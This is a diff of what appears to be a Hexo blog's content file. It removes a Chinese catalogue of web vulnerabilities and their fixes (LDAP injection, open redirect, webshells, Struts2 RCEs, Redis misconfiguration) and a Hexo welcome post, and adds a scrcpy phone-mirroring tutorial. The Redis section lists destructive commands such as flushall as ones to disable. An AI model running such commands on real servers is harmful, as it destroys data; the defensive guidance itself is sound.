-<h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><h3 id="LDAP注入漏洞描述"><a href="#LDAP注入漏洞描述" class="headerlink" title="LDAP注入漏洞描述"></a>LDAP注入漏洞描述</h3><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p>
-<h3 id="LDAP注入漏洞修复建议"><a href="#LDAP注入漏洞修复建议" class="headerlink" title="LDAP注入漏洞修复建议"></a>LDAP注入漏洞修复建议</h3><p>　　对用户的输入内容进行严格的过滤。</p>
-<h2 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h2><h3 id="URL跳转漏洞描述"><a href="#URL跳转漏洞描述" class="headerlink" title="URL跳转漏洞描述"></a>URL跳转漏洞描述</h3><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p>
-<h3 id="URL跳转漏洞修复建议"><a href="#URL跳转漏洞修复建议" class="headerlink" title="URL跳转漏洞修复建议"></a>URL跳转漏洞修复建议</h3><p>　　1、在进行页面跳转前校验传入的URL是否为可信域名。</p>
-<p>　　2、白名单规定跳转链接</p>
-<h2 id="明文传输"><a href="#明文传输" class="headerlink" title="明文传输"></a>明文传输</h2><h3 id="明文传输漏洞描述"><a href="#明文传输漏洞描述" class="headerlink" title="明文传输漏洞描述"></a>明文传输漏洞描述</h3><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p>
-<h3 id="明文传输漏洞修复建议"><a href="#明文传输漏洞修复建议" class="headerlink" title="明文传输漏洞修复建议"></a>明文传输漏洞修复建议</h3><p>　　1、用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</p>
-<p>　　2、使用https来保证传输的安全。</p>
-<h2 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h2><h3 id="网页木马漏洞描述"><a href="#网页木马漏洞描述" class="headerlink" title="网页木马漏洞描述"></a>网页木马漏洞描述</h3><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p>
-<h3 id="网页木马漏洞修复建议"><a href="#网页木马漏洞修复建议" class="headerlink" title="网页木马漏洞修复建议"></a>网页木马漏洞修复建议</h3><p>　　1、确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</p>
-<p>　　2、发现并及时修复已存在的漏洞。</p>
-<p>　　3、通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</p>
-<h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><h3 id="备份文件泄露漏洞描述"><a href="#备份文件泄露漏洞描述" class="headerlink" title="备份文件泄露漏洞描述"></a>备份文件泄露漏洞描述</h3><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p>
-<h3 id="备份文件泄露漏洞修复建议"><a href="#备份文件泄露漏洞修复建议" class="headerlink" title="备份文件泄露漏洞修复建议"></a>备份文件泄露漏洞修复建议</h3><p>　　1、不在网站目录下存放网站备份文件或敏感信息的文件。</p>
-<p>　　2、如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</p>
-<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="敏感信息泄露漏洞描述"><a href="#敏感信息泄露漏洞描述" class="headerlink" title="敏感信息泄露漏洞描述"></a>敏感信息泄露漏洞描述</h3><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p>
-<h3 id="敏感信息泄露漏洞修复建议"><a href="#敏感信息泄露漏洞修复建议" class="headerlink" title="敏感信息泄露漏洞修复建议"></a>敏感信息泄露漏洞修复建议</h3><p>　　1、如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</p>
-<p>　　2、不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</p>
-<p>　　3、在服务器端对相关敏感信息进行模糊化处理。</p>
-<p>　　4、对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</p>
-<h2 id="短信-邮件轰炸"><a href="#短信-邮件轰炸" class="headerlink" title="短信&#x2F;邮件轰炸"></a>短信&#x2F;邮件轰炸</h2><h3 id="邮件轰炸漏洞描述"><a href="#邮件轰炸漏洞描述" class="headerlink" title="邮件轰炸漏洞描述"></a>邮件轰炸漏洞描述</h3><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p>
-<h3 id="邮件轰炸漏洞修复建议"><a href="#邮件轰炸漏洞修复建议" class="headerlink" title="邮件轰炸漏洞修复建议"></a>邮件轰炸漏洞修复建议</h3><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p>
-<h2 id="phpinfo信息泄露"><a href="#phpinfo信息泄露" class="headerlink" title="phpinfo信息泄露"></a>phpinfo信息泄露</h2><h3 id="phpinfo信息泄露漏洞描述"><a href="#phpinfo信息泄露漏洞描述" class="headerlink" title="phpinfo信息泄露漏洞描述"></a>phpinfo信息泄露漏洞描述</h3><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p>
-<h3 id="phpinfo信息泄露漏洞修复建议"><a href="#phpinfo信息泄露漏洞修复建议" class="headerlink" title="phpinfo信息泄露漏洞修复建议"></a>phpinfo信息泄露漏洞修复建议</h3><p>　　1、删除phpinfo 函数。</p>
-<p>　　2、若文件无用可直接删除。</p>
-<h2 id="IIS短文件名泄露"><a href="#IIS短文件名泄露" class="headerlink" title="IIS短文件名泄露"></a>IIS短文件名泄露</h2><h3 id="IIS短文件名泄露漏洞描述"><a href="#IIS短文件名泄露漏洞描述" class="headerlink" title="IIS短文件名泄露漏洞描述"></a>IIS短文件名泄露漏洞描述</h3><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p>
-<p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p>
-<h3 id="IIS短文件名泄露漏洞修复建议"><a href="#IIS短文件名泄露漏洞修复建议" class="headerlink" title="IIS短文件名泄露漏洞修复建议"></a>IIS短文件名泄露漏洞修复建议</h3><p>　　修改Windows配置，关闭短文件名功能。</p>
-<p>　　1.关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p>
-<p>　　2.如果是虚拟主机空间用户,可采用以下修复方案：</p>
-<p>　　1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p>
-<p>　　2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p>
-<p>　　3）升级net framework 至4.0以上版本。</p>
-<p>　　3.将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a class="link"   href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82" >www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="应用程序错误信息泄露"><a href="#应用程序错误信息泄露" class="headerlink" title="应用程序错误信息泄露"></a>应用程序错误信息泄露</h2><h3 id="应用程序错误信息泄露漏洞描述"><a href="#应用程序错误信息泄露漏洞描述" class="headerlink" title="应用程序错误信息泄露漏洞描述"></a>应用程序错误信息泄露漏洞描述</h3><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p>
-<h3 id="应用程序错误信息泄露漏洞修复建议"><a href="#应用程序错误信息泄露漏洞修复建议" class="headerlink" title="应用程序错误信息泄露漏洞修复建议"></a>应用程序错误信息泄露漏洞修复建议</h3><p>　　1、自定义错误页面或使用统一的错误页面提示。</p>
-<h2 id="ApacheTomcat默认文件"><a href="#ApacheTomcat默认文件" class="headerlink" title="ApacheTomcat默认文件"></a>ApacheTomcat默认文件</h2><h3 id="ApacheTomcat默认文件漏洞描述"><a href="#ApacheTomcat默认文件漏洞描述" class="headerlink" title="ApacheTomcat默认文件漏洞描述"></a>ApacheTomcat默认文件漏洞描述</h3><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p>
-<h3 id="ApacheTomcat默认文件漏洞修复建议"><a href="#ApacheTomcat默认文件漏洞修复建议" class="headerlink" title="ApacheTomcat默认文件漏洞修复建议"></a>ApacheTomcat默认文件漏洞修复建议</h3><p>　　1、删除样例文件</p>
-<p>　　2、限制文件访问权限</p>
-<h2 id="Crossdomain-xml配置不当"><a href="#Crossdomain-xml配置不当" class="headerlink" title="Crossdomain.xml配置不当"></a>Crossdomain.xml配置不当</h2><h3 id="Crossdomain-xml配置不当漏洞描述"><a href="#Crossdomain-xml配置不当漏洞描述" class="headerlink" title="Crossdomain.xml配置不当漏洞描述"></a>Crossdomain.xml配置不当漏洞描述</h3><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p>
-<h3 id="Crossdomain-xml配置不当漏洞修复建议"><a href="#Crossdomain-xml配置不当漏洞修复建议" class="headerlink" title="Crossdomain.xml配置不当漏洞修复建议"></a>Crossdomain.xml配置不当漏洞修复建议</h3><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p>
-<h2 id="目标服务器启用了不安全HTTP方法"><a href="#目标服务器启用了不安全HTTP方法" class="headerlink" title="目标服务器启用了不安全HTTP方法"></a>目标服务器启用了不安全HTTP方法</h2><h3 id="目标服务器启用了不安全HTTP方法漏洞描述"><a href="#目标服务器启用了不安全HTTP方法漏洞描述" class="headerlink" title="目标服务器启用了不安全HTTP方法漏洞描述"></a>目标服务器启用了不安全HTTP方法漏洞描述</h3><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p>
-<h3 id="目标服务器启用了不安全HTTP方法漏洞修复建议"><a href="#目标服务器启用了不安全HTTP方法漏洞修复建议" class="headerlink" title="目标服务器启用了不安全HTTP方法漏洞修复建议"></a>目标服务器启用了不安全HTTP方法漏洞修复建议</h3><p>　　1、关闭不安全的传输方法，只开启POST、GET方法。</p>
-<p>　　2、如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</p>
-<h2 id="Weblogic-SSRF服务器请求伪造"><a href="#Weblogic-SSRF服务器请求伪造" class="headerlink" title="Weblogic SSRF服务器请求伪造"></a>Weblogic SSRF服务器请求伪造</h2><h3 id="Weblogic-SSRF服务器请求伪造漏洞描述"><a href="#Weblogic-SSRF服务器请求伪造漏洞描述" class="headerlink" title="Weblogic SSRF服务器请求伪造漏洞描述"></a>Weblogic SSRF服务器请求伪造漏洞描述</h3><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p>
-<h3 id="Weblogic-SSRF服务器请求伪造漏洞修复建议"><a href="#Weblogic-SSRF服务器请求伪造漏洞修复建议" class="headerlink" title="Weblogic SSRF服务器请求伪造漏洞修复建议"></a>Weblogic SSRF服务器请求伪造漏洞修复建议</h3><p>　　1、若不影响业务则可删除uddiexplorer文件夹</p>
-<p>　　2、限制uddiexplorer应用只能内网访问</p>
-<h2 id="Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-019）"></a>Apache Struts2 远程代码执行漏洞（S2-019）</h2><h3 id="S2-019漏洞描述"><a href="#S2-019漏洞描述" class="headerlink" title="S2-019漏洞描述"></a>S2-019漏洞描述</h3><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
-<h3 id="S2-019漏洞修复建议"><a href="#S2-019漏洞修复建议" class="headerlink" title="S2-019漏洞修复建议"></a>S2-019漏洞修复建议</h3><p>　　1、目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</p>
-<p>　　2、或者手工设置struts.xml文件&lt;constantname&#x3D;”struts.enable.DynamicMethodInvocation”value&#x3D;”false”&#x2F;&gt;</p>
-<h2 id="Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-037）"></a>Apache Struts2 远程代码执行漏洞（S2-037）</h2><h3 id="S2-037漏洞描述"><a href="#S2-037漏洞描述" class="headerlink" title="S2-037漏洞描述"></a>S2-037漏洞描述</h3><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p>
-<h3 id="S2-037漏洞修复建议"><a href="#S2-037漏洞修复建议" class="headerlink" title="S2-037漏洞修复建议"></a>S2-037漏洞修复建议</h3><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
-<h2 id="Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞"></a>Apache Struts2 DevMode 远程代码执行漏洞</h2><h3 id="Apache-Struts2-DevMode-远程代码执行漏洞描述"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞描述" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞描述"></a>Apache Struts2 DevMode 远程代码执行漏洞描述</h3><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
-<h3 id="Apache-Struts2-DevMode-远程代码执行漏洞修复建议"><a href="#Apache-Struts2-DevMode-远程代码执行漏洞修复建议" class="headerlink" title="Apache Struts2 DevMode 远程代码执行漏洞修复建议"></a>Apache Struts2 DevMode 远程代码执行漏洞修复建议</h3><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p>
-<p>　　或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name&#x3D;”struts.devMode”value&#x3D;”false”&#x2F;&gt;。</p>
-<h2 id="Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-045）"></a>Apache Struts2 远程代码执行漏洞（S2-045）</h2><h3 id="S2-045漏洞描述"><a href="#S2-045漏洞描述" class="headerlink" title="S2-045漏洞描述"></a>S2-045漏洞描述</h3><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p>
-<h3 id="S2-045漏洞修复建议"><a href="#S2-045漏洞修复建议" class="headerlink" title="S2-045漏洞修复建议"></a>S2-045漏洞修复建议</h3><p>　　检测方式查看web目录下&#x2F;WEB-INF&#x2F;lib&#x2F;目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
-<p>　　1、建议用户到官方获取最新补丁或者最新版本程序。</p>
-<p>　　2、更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p>
-<p>　　3、临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
-<p>　　4、修改WEB-INF&#x2F;classes目录下的配置</p>
-<p>　　在WEB-INF&#x2F;classes目录下的struts.xml中的struts 标签下添加</p>
-<p>　　&lt;constantname&#x3D;”struts.custom.i18n.resources”value&#x3D;”global”&#x2F;&gt;；</p>
-<p>　　在WEB-INF&#x2F;classes&#x2F;目录下添加global.properties，文件内容如下:struts.messages.upload.error.InvalidContentTypeException&#x3D;1</p>
-<h2 id="Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="Apache Struts2 远程代码执行漏洞（S2-033）"></a>Apache Struts2 远程代码执行漏洞（S2-033）</h2><h3 id="S2-033漏洞描述"><a href="#S2-033漏洞描述" class="headerlink" title="S2-033漏洞描述"></a>S2-033漏洞描述</h3><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p>
-<h3 id="S2-033漏洞修复建议"><a href="#S2-033漏洞修复建议" class="headerlink" title="S2-033漏洞修复建议"></a>S2-033漏洞修复建议</h3><p>　　1、用户到官方获取最新补丁或者最新版本程序。</p>
-<p>　　2、或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</p>
-<h2 id="redis相关漏洞修复"><a href="#redis相关漏洞修复" class="headerlink" title="redis相关漏洞修复"></a>redis相关漏洞修复</h2><h3 id="redis相关漏洞描述"><a href="#redis相关漏洞描述" class="headerlink" title="redis相关漏洞描述"></a>redis相关漏洞描述</h3><p>　　redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p>
-<h3 id="redis相关漏洞修复建议"><a href="#redis相关漏洞修复建议" class="headerlink" title="redis相关漏洞修复建议"></a>redis相关漏洞修复建议</h3><p>　　1.禁用一些高危命令</p>
-<p>　　　　常见如：flushdb，flushall，config，keys 等</p>
-<p>　　2.以低权限运行 Redis 服务</p>
-<p>　　3.为 Redis 添加密码验证</p>
-<p>　　4.禁止外网访问 Redis</p>
-<p>　　5.保证 authorized_keys 文件的安全</p>
+    <title>如何在电脑上操作手机</title>
+    <url>/2023/10/16/TP-tool/</url>
+    <content><![CDATA[<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>此应用程序镜像Android设备（视频和音频）连接通过 USB或TCP&#x2F;IP，并允许控制与计算机的键盘和鼠标的设备。它不需要任何root访问，它适用于Linux、Windows和macOS。</p>
+<h2 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-Over.jpg"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>Android设备至少需要API 21（Android 5.0）。</p>
+<p>API &#x3D; 30（Android 11+）支持音频转发。</p>
+<p>请确保在设备上启用了USB调试。</p>
+<p>在某些设备上，您还需要启用附加选项USB debugging (Security Settings)（该选项与USB debugging不同）用键盘和鼠标来控制它。<br>重新启动设备是必要的一次 此选项被设置。</p>
+<p>注意，在OTG中运行scrcpy不需要USB调试模式。</p>
+<h3 id="1、手机要开启开发者模式"><a href="#1、手机要开启开发者模式" class="headerlink" title="1、手机要开启开发者模式"></a>1、手机要开启开发者模式</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-6.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h3 id="2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB-debugging功能"><a href="#2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB-debugging功能" class="headerlink" title="2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB debugging功能"></a>2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB debugging功能</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-8.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h3 id="3、需要在手机上允许电脑进行操作"><a href="#3、需要在手机上允许电脑进行操作" class="headerlink" title="3、需要在手机上允许电脑进行操作"></a>3、需要在手机上允许电脑进行操作</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-7.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="官方WiKi"><a href="#官方WiKi" class="headerlink" title="官方WiKi"></a>官方WiKi</h2><div class="note default"><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/Genymobile/scrcpy/wiki</span><br></pre></td></tr></table></figure></div></div>
+
+<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><div class="note default"><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/Genymobile/scrcpy/blob/master/doc/windows.md</span><br></pre></td></tr></table></figure></div></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-1.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="文件中具体内容"><a href="#文件中具体内容" class="headerlink" title="文件中具体内容"></a>文件中具体内容</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-2.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="如何操作内容-1"><a href="#如何操作内容-1" class="headerlink" title="如何操作内容(1)"></a>如何操作内容(1)</h2><p>通过CMD命令进入到命令行界面输入adb usb 查看是否连通相关内容<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-3.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="如何操作内容-2"><a href="#如何操作内容-2" class="headerlink" title="如何操作内容(2)"></a>如何操作内容(2)</h2><p>对内容进行链接操作<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-4.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="如何操作内容-3"><a href="#如何操作内容-3" class="headerlink" title="如何操作内容(3)"></a>如何操作内容(3)</h2><p>发现无法连接，经过排查发现是存在多个连接设备，需要使用命令 -s 明确机器识别码才能成功<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-5.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h2 id="个人最终效果"><a href="#个人最终效果" class="headerlink" title="个人最终效果"></a>个人最终效果</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/ep/TP-scrcpy-win-down-9.png"
+                      alt="Scrcpy 图片"
+                ></p>
+<h3 id="个人推荐指数"><a href="#个人推荐指数" class="headerlink" title="个人推荐指数"></a>个人推荐指数</h3><p>推荐：⭐⭐⭐⭐  较为推荐</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>摸鱼工具</category>
       </categories>
       <tags>
-        <tag>漏洞修复</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>欢迎使用Hexo</title>
-    <url>/2023/09/08/hello-world/</url>
-    <content><![CDATA[<p>欢迎来到 <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! 这是第一篇文档，如果对此有相关疑问请点击 <a class="link"   href="https://hexo.io/docs/" >文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。 如果您在使用Hexo时遇到任何问题，您可以在<a class="link"   href="https://hexo.io/docs/troubleshooting.html" >故障排除 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中找到答案或者你可以直接来问我 <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
-<h2 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h2><h3 id="创建新的帖子"><a href="#创建新的帖子" class="headerlink" title="创建新的帖子"></a>创建新的帖子</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>更多信息: <a class="link"   href="https://hexo.io/docs/writing.html" >写作 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="运行服务"><a href="#运行服务" class="headerlink" title="运行服务"></a>运行服务</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>更多信息: <a class="link"   href="https://hexo.io/docs/server.html" >服务器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>更多信息: <a class="link"   href="https://hexo.io/docs/generating.html" >生成 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="部署至远程站点"><a href="#部署至远程站点" class="headerlink" title="部署至远程站点"></a>部署至远程站点</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>更多信息: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >部署 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="先部署在本地进行调试"><a href="#先部署在本地进行调试" class="headerlink" title="先部署在本地进行调试"></a>先部署在本地进行调试</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo s</span><br><span class="line">之后访问页面</span><br><span class="line">$ http://localhost:4000/</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="测试图片"><a href="#测试图片" class="headerlink" title="测试图片"></a>测试图片</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Hexo/Hexo.jpg"
-                      alt="Hexo 图片"
-                ><br>分辨率为3026*1892</p>
-<h2 id="笔记模块"><a href="#笔记模块" class="headerlink" title="笔记模块"></a>笔记模块</h2><h3 id="大号提示块"><a href="#大号提示块" class="headerlink" title="大号提示块"></a>大号提示块</h3><div class="note-large default"><div class="notel-title"><i class="notel-icon fa-solid fa-info"></i><p>信息</p>
-</div><div class="notel-content"><p>换行测试<br>换行测试<br>换行测试<br>blue red cyan purple orange yellow green</p>
-</div></div>
-<div class="note-large blue"><div class="notel-title"><p>提示</p>
-</div><div class="notel-content"><p>换行测试<br>换行测试<br>换行测试</p>
-</div></div>
-<div class="note-large red"><div class="notel-title"><p>自定义标题</p>
-</div><div class="notel-content"><p>换行测试<br>换行测试<br>换行测试</p>
-</div></div>
-
